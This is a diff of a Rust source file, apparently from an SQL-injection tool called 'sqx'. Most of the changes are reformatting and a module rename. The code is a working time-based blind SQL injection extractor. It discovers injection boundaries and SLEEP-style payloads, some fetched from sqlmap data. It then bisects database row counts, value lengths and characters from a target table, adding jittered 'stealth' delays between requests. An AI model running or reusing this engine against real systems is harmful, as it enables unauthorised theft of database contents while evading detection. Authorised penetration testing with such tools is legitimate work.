@@ -1,18 +1,18 @@
 //! Time-based blind data extraction: bisection algorithm using SLEEP/WAITFOR
 //! delays as the oracle instead of page-content differences.
 
+use anyhow::Result;
 use std::time::{Duration, Instant};
 use tokio::time::timeout;
-use anyhow::Result;
 use tracing::{debug, info};
 
 use crate::sqx::{
     detector::SqliDetector,
     models::{
-        BlindExtractionConfig, BlindExtractionProgress, BlindExtractionResult,
-        CancellationToken, ExtractionStatus,
+        BlindExtractionConfig, BlindExtractionProgress, BlindExtractionResult, CancellationToken,
+        ExtractionStatus,
     },
-    payload_fetcher::{BOUNDARIES, DynamicPayloads},
+    payloads::{PayloadDatabase, BOUNDARIES},
 };
 
 impl SqliDetector {
@@ -39,14 +39,15 @@ impl SqliDetector {
         );
 
         if let Some(ref token) = cancel_token
-            && token.is_cancelled() {
-                return Ok(BlindExtractionResult {
-                    extracted_values: vec![],
-                    total_requests: 0,
-                    extraction_time_secs: 0,
-                    technique_used: "Cancelled".to_string(),
-                });
-            }
+            && token.is_cancelled()
+        {
+            return Ok(BlindExtractionResult {
+                extracted_values: vec![],
+                total_requests: 0,
+                extraction_time_secs: 0,
+                technique_used: "Cancelled".to_string(),
+            });
+        }
 
         // Statistical baseline: 3 samples → mean + 2σ threshold
         let (baseline_mean, baseline_stddev) = self.measure_baseline_timing(url, 3).await?;
@@ -61,7 +62,7 @@ impl SqliDetector {
 
         // Discover boundary if no hint provided.
         let (close, balance) = if let Some(hint) = boundary_hint {
-            if let Some((c, b)) = DynamicPayloads::find_boundary(hint) {
+            if let Some((c, b)) = PayloadDatabase::find_boundary_static(hint) {
                 info!("Using hinted boundary '{}' for time-based extraction", hint);
                 (c, b)
             } else {
@@ -84,16 +85,34 @@ impl SqliDetector {
 
         // Discover working time payload template (dialect or fetched fallback).
         let time_template = if let Some(v) = vector {
-             v.to_string()
+            v.to_string()
         } else {
-            self.discover_time_payload(url, param, original_value, dbms, &close, &balance, threshold).await
+            self.discover_time_payload(
+                url,
+                param,
+                original_value,
+                dbms,
+                &close,
+                &balance,
+                threshold,
+            )
+            .await
         };
 
         let row_count = self
             .get_row_count_time_based(
-                url, param, original_value, dbms, extraction_config,
-                &close, &balance, &time_template, vector,
-                &mut total_requests, cancel_token.as_ref(), threshold,
+                url,
+                param,
+                original_value,
+                dbms,
+                extraction_config,
+                &close,
+                &balance,
+                &time_template,
+                vector,
+                &mut total_requests,
+                cancel_token.as_ref(),
+                threshold,
             )
             .await?;
 
@@ -101,16 +120,27 @@ impl SqliDetector {
 
         for row_index in 0..rows_to_extract {
             if let Some(ref token) = cancel_token
-                && token.is_cancelled() {
-                    break;
-                }
+                && token.is_cancelled()
+            {
+                break;
+            }
 
             let value = self
                 .extract_string_time_based(
-                    url, param, original_value, dbms, extraction_config,
-                    row_index, &close, &balance, &time_template, vector,
+                    url,
+                    param,
+                    original_value,
+                    dbms,
+                    extraction_config,
+                    row_index,
+                    &close,
+                    &balance,
+                    &time_template,
+                    vector,
                     &mut total_requests,
-                    progress_callback.as_ref(), cancel_token.as_ref(), threshold,
+                    progress_callback.as_ref(),
+                    cancel_token.as_ref(),
+                    threshold,
                 )
                 .await?;
 
@@ -129,7 +159,10 @@ impl SqliDetector {
         }
 
         let elapsed = start_time.elapsed();
-        let is_cancelled = cancel_token.as_ref().map(|t| t.is_cancelled()).unwrap_or(false);
+        let is_cancelled = cancel_token
+            .as_ref()
+            .map(|t| t.is_cancelled())
+            .unwrap_or(false);
 
         Ok(BlindExtractionResult {
             extracted_values,
@@ -155,11 +188,18 @@ impl SqliDetector {
         let is_numeric = original_value.parse::<i64>().is_ok();
 
         for boundary in BOUNDARIES.iter() {
-            if !is_numeric && boundary.close.is_empty() { continue; }
+            if !is_numeric && boundary.close.is_empty() {
+                continue;
+            }
 
-            let payload = format!("{}{} AND 1=1 {}",
-                original_value, boundary.close, boundary.balance);
-            if self.is_time_delayed(url, param, original_value, dbms, &payload, threshold).await {
+            let payload = format!(
+                "{}{} AND 1=1 {}",
+                original_value, boundary.close, boundary.balance
+            );
+            if self
+                .is_time_delayed(url, param, original_value, dbms, &payload, threshold)
+                .await
+            {
                 debug!(
                     "Discovered working boundary for time-based extraction: {} ({})",
                     boundary.label, boundary.close
@@ -169,24 +209,51 @@ impl SqliDetector {
                     boundary.balance.to_string(),
                 )));
             }
-            tokio::time::sleep(crate::sqx::stealth::jittered_delay(self.config.delay_ms, self.config.stealth.jitter_pct)).await;
+            tokio::time::sleep(crate::sqx::stealth::jittered_delay(
+                self.config.delay_ms,
+                self.config.stealth.jitter_pct,
+            ))
+            .await;
         }
 
-        let dynamic = DynamicPayloads::load();
-        for b in &dynamic.boundaries {
-            if !is_numeric && b.prefix.is_empty() { continue; }
+        let dynamic = PayloadDatabase::load();
+        for b in &dynamic.dynamic.boundaries {
+            if !is_numeric && b.prefix.is_empty() {
+                continue;
+            }
 
-            let prefix = DynamicPayloads::resolve_placeholders(&b.prefix, 42, "sqx", original_value, "1=1", 5);
-            let suffix = DynamicPayloads::resolve_placeholders(&b.suffix, 42, "sqx", original_value, "1=1", 5);
+            let prefix = crate::sqx::payloads::resolve_placeholders(
+                &b.prefix,
+                42,
+                "sqx",
+                original_value,
+                "1=1",
+                5,
+            );
+            let suffix = crate::sqx::payloads::resolve_placeholders(
+                &b.suffix,
+                42,
+                "sqx",
+                original_value,
+                "1=1",
+                5,
+            );
             let payload = format!("{}{}{}{}", original_value, prefix, "1=1", suffix);
-            if self.is_time_delayed(url, param, original_value, dbms, &payload, threshold).await {
+            if self
+                .is_time_delayed(url, param, original_value, dbms, &payload, threshold)
+                .await
+            {
                 debug!(
                     "Discovered working dynamic boundary for time-based extraction: dyn:{}",
                     b.prefix
                 );
                 return Ok(Some((prefix, suffix)));
             }
-            tokio::time::sleep(crate::sqx::stealth::jittered_delay(self.config.delay_ms, self.config.stealth.jitter_pct)).await;
+            tokio::time::sleep(crate::sqx::stealth::jittered_delay(
+                self.config.delay_ms,
+                self.config.stealth.jitter_pct,
+            ))
+            .await;
         }
 
         Ok(None)
@@ -208,29 +275,61 @@ impl SqliDetector {
 
         // 1. Try dialect conditional_sleep first.
         let dialect_box = crate::sqx::dbms::dialect_by_name(dbms);
-        let dialect = dialect_box.as_deref().unwrap_or(&crate::sqx::dbms::major::MySQL);
+        let dialect = dialect_box
+            .as_deref()
+            .unwrap_or(&crate::sqx::dbms::major::MySQL);
         let conditional = dialect.conditional_sleep("1=1", sleep_secs);
         if !conditional.is_empty() {
-            let payload = format!("{}{} AND {} {}", original_value, close, conditional, balance);
-            if self.is_time_delayed(url, param, original_value, dbms, &payload, threshold).await {
+            let payload = format!(
+                "{}{} AND {} {}",
+                original_value, close, conditional, balance
+            );
+            if self
+                .is_time_delayed(url, param, original_value, dbms, &payload, threshold)
+                .await
+            {
                 debug!("Dialect conditional_sleep works for time-based extraction");
                 return format!("{}{} AND {{}} {}", original_value, close, balance);
             }
         }
 
         // 2. Try fetched time-payload tests (stype=5) from sqlmap XML.
-        let dynamic = DynamicPayloads::load();
-        let time_tests: Vec<_> = dynamic.tests.iter().filter(|t| t.stype == 5).collect();
+        let dynamic = PayloadDatabase::load();
+        let time_tests: Vec<_> = dynamic.dynamic.tests.iter().filter(|t| t.stype == 5).collect();
 
         for test in time_tests {
-            let suffix = DynamicPayloads::resolve_placeholders(&test.request_payload, 42, "sqx", original_value, "1=1", sleep_secs);
+            let suffix = crate::sqx::payloads::resolve_placeholders(
+                &test.request_payload,
+                42,
+                "sqx",
+                original_value,
+                "1=1",
+                sleep_secs,
+            );
             let payload = format!("{}{} AND {} {}", original_value, close, suffix, balance);
-            if self.is_time_delayed(url, param, original_value, dbms, &payload, threshold).await {
+            if self
+                .is_time_delayed(url, param, original_value, dbms, &payload, threshold)
+                .await
+            {
                 debug!("Fetched time payload works: {}", test.title);
-                let template_suffix = DynamicPayloads::resolve_placeholders(&test.request_payload, 42, "sqx", original_value, "{}", sleep_secs);
-                return format!("{}{} AND {} {}", original_value, close, template_suffix, balance);
+                let template_suffix = crate::sqx::payloads::resolve_placeholders(
+                    &test.request_payload,
+                    42,
+                    "sqx",
+                    original_value,
+                    "{}",
+                    sleep_secs,
+                );
+                return format!(
+                    "{}{} AND {} {}",
+                    original_value, close, template_suffix, balance
+                );
             }
-            tokio::time::sleep(crate::sqx::stealth::jittered_delay(self.config.delay_ms, self.config.stealth.jitter_pct)).await;
+            tokio::time::sleep(crate::sqx::stealth::jittered_delay(
+                self.config.delay_ms,
+                self.config.stealth.jitter_pct,
+            ))
+            .await;
         }
 
         // 3. Fallback to dialect template (even if calibration failed, it's our best guess).
@@ -250,7 +349,12 @@ impl SqliDetector {
         let sleep_secs = self.sleep_duration_secs();
         let test_url = self.build_test_url(url, param, original_value, payload);
         let start = Instant::now();
-        match timeout(Duration::from_secs(10 + sleep_secs), self.send_request(&test_url)).await {
+        match timeout(
+            Duration::from_secs(10 + sleep_secs),
+            self.send_request(&test_url),
+        )
+        .await
+        {
             Ok(Ok(_)) => {
                 let duration = start.elapsed();
                 let detection_threshold = threshold + Duration::from_secs(sleep_secs / 2);
@@ -278,16 +382,33 @@ impl SqliDetector {
         threshold: Duration,
     ) -> Result<usize> {
         if let Some(token) = cancel_token
-            && token.is_cancelled() {
-                return Ok(0);
-            }
+            && token.is_cancelled()
+        {
+            return Ok(0);
+        }
+
+        if config.custom_query.is_some() {
+            // Custom-query extraction is currently a scalar workflow.
+            return Ok(1);
+        }
 
         let query = format!("(SELECT COUNT(*) FROM {})", config.target_table);
         let count = self
             .extract_number_time_based(
-                url, param, original_value, dbms, &query,
-                close, balance, time_template, vector,
-                0, 9999, request_count, cancel_token, threshold,
+                url,
+                param,
+                original_value,
+                dbms,
+                &query,
+                close,
+                balance,
+                time_template,
+                vector,
+                0,
+                9999,
+                request_count,
+                cancel_token,
+                threshold,
             )
             .await?;
 
@@ -331,28 +452,42 @@ impl SqliDetector {
         };
 
         if let Some(token) = cancel_token
-            && token.is_cancelled() {
-                return Ok(result);
-            }
+            && token.is_cancelled()
+        {
+            return Ok(result);
+        }
 
         let length_query = format!("LENGTH({})", subquery);
         let length = self
             .extract_number_time_based(
-                url, param, original_value, dbms, &length_query,
-                close, balance, time_template, vector,
-                0, config.max_length_per_value as i32, request_count,
-                cancel_token, threshold,
+                url,
+                param,
+                original_value,
+                dbms,
+                &length_query,
+                close,
+                balance,
+                time_template,
+                vector,
+                0,
+                config.max_length_per_value as i32,
+                request_count,
+                cancel_token,
+                threshold,
             )
             .await?;
 
         for pos in 1..=length {
             if let Some(token) = cancel_token
-                && token.is_cancelled() {
-                    return Ok(result);
-                }
+                && token.is_cancelled()
+            {
+                return Ok(result);
+            }
 
             let dialect_box = crate::sqx::dbms::dialect_by_name(dbms);
-            let dialect = dialect_box.as_deref().unwrap_or(&crate::sqx::dbms::major::MySQL);
+            let dialect = dialect_box
+                .as_deref()
+                .unwrap_or(&crate::sqx::dbms::major::MySQL);
             let char_query = format!(
                 "{}({}({}, {}, 1))",
                 dialect.char_code_function(),
@@ -362,9 +497,20 @@ impl SqliDetector {
             );
             let ascii_val = self
                 .extract_number_time_based(
-                    url, param, original_value, dbms, &char_query,
-                    close, balance, time_template, vector,
-                    0, 127, request_count, cancel_token, threshold,
+                    url,
+                    param,
+                    original_value,
+                    dbms,
+                    &char_query,
+                    close,
+                    balance,
+                    time_template,
+                    vector,
+                    0,
+                    127,
+                    request_count,
+                    cancel_token,
+                    threshold,
                 )
                 .await?;
 
@@ -408,17 +554,26 @@ impl SqliDetector {
 
         while low < high {
             if let Some(token) = cancel_token
-                && token.is_cancelled() {
-                    return Ok(low);
-                }
+                && token.is_cancelled()
+            {
+                return Ok(low);
+            }
 
             let mid = low + (high - low) / 2;
 
             let condition = format!("({}) > {}", query, mid);
             let is_greater = self
                 .test_condition_time_based(
-                    url, param, original_value, dbms, &condition,
-                    close, balance, time_template, vector, threshold,
+                    url,
+                    param,
+                    original_value,
+                    dbms,
+                    &condition,
+                    close,
+                    balance,
+                    time_template,
+                    vector,
+                    threshold,
                 )
                 .await?;
             *request_count += 1;
@@ -429,7 +584,11 @@ impl SqliDetector {
                 high = mid;
             }
 
-            tokio::time::sleep(crate::sqx::stealth::jittered_delay(self.config.delay_ms, self.config.stealth.jitter_pct)).await;
+            tokio::time::sleep(crate::sqx::stealth::jittered_delay(
+                self.config.delay_ms,
+                self.config.stealth.jitter_pct,
+            ))
+            .await;
         }
 
         Ok(low)
@@ -452,20 +611,37 @@ impl SqliDetector {
         let sleep_secs = self.sleep_duration_secs();
 
         let payload = if let Some(v) = vector {
-            DynamicPayloads::resolve_placeholders(v, 42, "sqx", original_value, condition, sleep_secs)
+            crate::sqx::payloads::resolve_placeholders(
+                v,
+                42,
+                "sqx",
+                original_value,
+                condition,
+                sleep_secs,
+            )
         } else if time_template.contains("{}") {
             time_template.replace("{}", condition)
         } else {
             let dialect_box = crate::sqx::dbms::dialect_by_name(dbms);
-            let dialect = dialect_box.as_deref().unwrap_or(&crate::sqx::dbms::major::MySQL);
+            let dialect = dialect_box
+                .as_deref()
+                .unwrap_or(&crate::sqx::dbms::major::MySQL);
             let conditional = dialect.conditional_sleep(condition, sleep_secs);
-            format!("{}{} AND {} {}", original_value, close, conditional, balance)
+            format!(
+                "{}{} AND {} {}",
+                original_value, close, conditional, balance
+            )
         };
 
         let test_url = self.build_test_url(url, param, original_value, &payload);
 
         let start = Instant::now();
-        match timeout(Duration::from_secs(10 + sleep_secs), self.send_request(&test_url)).await {
+        match timeout(
+            Duration::from_secs(10 + sleep_secs),
+            self.send_request(&test_url),
+        )
+        .await
+        {
             Ok(Ok(_)) => {
                 let duration = start.elapsed();
                 let detection_threshold = threshold + Duration::from_secs(sleep_secs / 2);
